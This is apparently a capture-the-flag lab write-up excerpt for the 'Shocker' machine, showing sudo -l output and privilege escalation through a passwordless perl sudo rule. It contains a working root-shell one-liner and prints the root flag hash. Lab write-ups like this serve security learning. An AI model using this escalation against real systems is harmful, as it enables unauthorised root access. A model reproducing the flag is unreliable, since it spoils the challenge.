## sudo -l

```
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

* let's check out https://gtfobins.github.io
* `sudo perl -e 'exec "/bin/sh";'`
* root.txt - `52c2715605d70c7619030560dc1ca467`
